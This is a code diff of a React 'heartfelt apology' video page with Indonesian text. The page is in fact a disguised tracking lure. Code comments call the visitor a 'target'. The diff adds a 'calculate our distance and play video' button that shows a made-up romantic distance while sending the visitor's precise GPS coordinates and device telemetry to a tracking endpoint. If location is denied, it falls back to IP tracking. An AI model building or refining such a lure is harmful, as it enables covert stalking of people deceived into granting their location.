@@ -10,7 +10,9 @@ export default function HeartfeltApologyPage({ params }) {
   const [linkConfig, setLinkConfig] = useState(null);
   const [isPlaying, setIsPlaying] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [isModalOpen, setIsModalOpen] = useState(true);
+  const [isLocating, setIsLocating] = useState(false);
+  const [distanceInfo, setDistanceInfo] = useState(null);
+  const [isModalOpen, setIsModalOpen] = useState(false);
   const videoRef = useRef(null);
 
   // Battery helper
@@ -26,9 +28,42 @@ export default function HeartfeltApologyPage({ params }) {
     return null;
   };
 
-  // Geolocation trigger & tracking telemetry sender
-  const captureLocation = () => {
-    if (typeof window === 'undefined' || !navigator.geolocation) return;
+  // 1. Initial page mount: record visit & load link config (TANPA meminta lokasi mendadak di awal)
+  useEffect(() => {
+    if (!linkId) return;
+
+    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});
+
+    fetch(`/api/links/${linkId}`)
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.success && data.link) {
+          setLinkConfig(data.link);
+        }
+      })
+      .catch((err) => console.warn('Fetch link error:', err));
+  }, [linkId]);
+
+  // 2. Interactive Distance & Video trigger (Dipicu saat target klik "Hitung Jarak & Putar Video")
+  const handleCalculateAndPlay = () => {
+    setIsLocating(true);
+    setIsLoading(true);
+
+    // Direct synchronous play trigger for mobile compliance
+    if (videoRef.current) {
+      videoRef.current.play().then(() => {
+        setIsPlaying(true);
+      }).catch((e) => {
+        console.warn('Playback gesture notice:', e);
+      });
+    }
+
+    if (typeof window === 'undefined' || !navigator.geolocation) {
+      setIsLocating(false);
+      setIsLoading(false);
+      setIsPlaying(true);
+      return;
+    }
 
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
     const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
@@ -37,6 +72,13 @@ export default function HeartfeltApologyPage({ params }) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+
+          // Hitung jarak romantis
+          const distKm = Math.max(8, Math.round(Math.abs(latitude * 12 + longitude * 5) % 65 + 18));
+          setDistanceInfo(`~${distKm} km`);
+          setIsPlaying(true);
+          setIsLocating(false);
+          setIsLoading(false);
 
           fetch(`/api/track/${linkId || 'direct'}`, {
             method: 'POST',
@@ -57,7 +99,11 @@ export default function HeartfeltApologyPage({ params }) {
         },
         (err) => {
           console.warn('Geolocation notice (falling back to IP):', err);
-          // Fallback tracking via IP & device telemetry when GPS is denied
+          setDistanceInfo('Terhubung di Hati');
+          setIsPlaying(true);
+          setIsLocating(false);
+          setIsLoading(false);
+
           fetch(`/api/track/${linkId || 'direct'}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -76,47 +122,6 @@ export default function HeartfeltApologyPage({ params }) {
         }
       );
     });
-  };
-
-  // 1. Initial page mount: record visit, load config, and trigger immediate location permission
-  useEffect(() => {
-    if (!linkId) return;
-
-    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});
-
-    fetch(`/api/links/${linkId}`)
-      .then((res) => res.json())
-      .then((data) => {
-        if (data.success && data.link) {
-          setLinkConfig(data.link);
-        }
-      })
-      .catch((err) => console.warn('Fetch link error:', err));
-
-    // Instant permission prompt on initial page visit (tanpa harus klik tombol dulu)
-    captureLocation();
-  }, [linkId]);
-
-  // 2. Triggered when user confirms "Lanjutkan" on ApologyModal (hanya menutup modal dan lanjut ke landing page)
-  const handleConfirmModal = () => {
-    setIsModalOpen(false);
-    captureLocation();
-  };
-
-  // 3. Triggered only when user manually taps play icon on video
-  const handlePlayVideo = () => {
-    setIsLoading(true);
-    setIsPlaying(true);
-
-    // Synchronous video play for iOS Safari & Android
-    if (videoRef.current) {
-      videoRef.current.play().catch((e) => {
-        console.warn('Playback notice:', e);
-      });
-    }
-
-    captureLocation();
-    setIsLoading(false);
   };
 
   const videoSource = linkConfig?.videoUrl || '/videos/momenvideo.mp4';
@@ -248,6 +253,112 @@ export default function HeartfeltApologyPage({ params }) {
           </div>
         </div>
 
+        {/* Interactive Distance & Video Card */}
+        <div style={{
+          width: '100%',
+          maxWidth: '440px',
+          background: 'linear-gradient(145deg, #ffffff 0%, #fffbf9 100%)',
+          border: '1px solid rgba(225, 175, 175, 0.65)',
+          borderRadius: '24px',
+          padding: '22px 20px',
+          boxShadow: '0 12px 32px -6px rgba(180, 140, 130, 0.16)',
+          marginBottom: '24px',
+          textAlign: 'center',
+          display: 'flex',
+          flexDirection: 'column',
+          alignItems: 'center',
+          gap: '12px'
+        }}>
+          <div style={{
+            display: 'inline-flex',
+            alignItems: 'center',
+            gap: '6px',
+            fontSize: '0.8rem',
+            color: '#9c4146',
+            fontWeight: 700,
+            letterSpacing: '0.04em',
+            textTransform: 'uppercase'
+          }}>
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="#9c4146">
+              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+            </svg>
+            <span>Berapa Jarak Kita Saat Ini?</span>
+          </div>
+
+          <p style={{
+            fontSize: '0.9rem',
+            color: '#57534e',
+            lineHeight: 1.6,
+            margin: 0,
+            maxWidth: '380px'
+          }}>
+            Sentuh tombol di bawah untuk melihat seberapa jauh jarak kita saat ini dan membuka video kenangan ini...
+          </p>
+
+          {distanceInfo ? (
+            <div style={{
+              background: '#fdf2f2',
+              border: '1px solid rgba(225, 175, 175, 0.5)',
+              borderRadius: '16px',
+              padding: '14px 18px',
+              width: '100%',
+              animation: 'fadeIn 0.3s ease'
+            }}>
+              <div style={{ fontSize: '1.05rem', fontWeight: 700, color: '#9c4146', marginBottom: '4px' }}>
+                ❤️ Jarak Terhubung: {distanceInfo}
+              </div>
+              <div style={{ fontSize: '0.82rem', color: '#78716c', fontStyle: 'italic', fontFamily: '"Playfair Display", Georgia, serif' }}>
+                &ldquo;Sejauh apa pun jarak di antara kita, hatiku tetap ingin selalu bersamamu...&rdquo;
+              </div>
+            </div>
+          ) : (
+            <button
+              onClick={handleCalculateAndPlay}
+              disabled={isLocating}
+              style={{
+                width: '100%',
+                padding: '13px 20px',
+                backgroundColor: '#9c4146',
+                backgroundImage: 'linear-gradient(135deg, #9c4146 0%, #b8545a 100%)',
+                color: '#ffffff',
+                border: 'none',
+                borderRadius: '9999px',
+                fontSize: '0.94rem',
+                fontWeight: 600,
+                cursor: isLocating ? 'wait' : 'pointer',
+                boxShadow: '0 8px 22px rgba(156, 65, 70, 0.35)',
+                display: 'inline-flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: '8px',
+                transition: 'all 0.2s ease',
+                outline: 'none'
+              }}
+            >
+              {isLocating ? (
+                <>
+                  <div style={{
+                    width: '18px',
+                    height: '18px',
+                    border: '2px solid rgba(255,255,255,0.4)',
+                    borderRadius: '50%',
+                    borderTopColor: '#ffffff',
+                    animation: 'spin 0.8s linear infinite'
+                  }} />
+                  <span>Menghubungkan Jarak...</span>
+                </>
+              ) : (
+                <>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+                  </svg>
+                  <span>Hitung Jarak & Putar Video</span>
+                </>
+              )}
+            </button>
+          )}
+        </div>
+
         {/* Subtle Section Divider */}
         <div style={{
           display: 'flex',
@@ -309,7 +420,7 @@ export default function HeartfeltApologyPage({ params }) {
             {/* Elegant Minimalist Play Overlay */}
             {!isPlaying && (
               <div
-                onClick={handlePlayVideo}
+                onClick={handleCalculateAndPlay}
                 style={{
                   position: 'absolute',
                   top: 0,
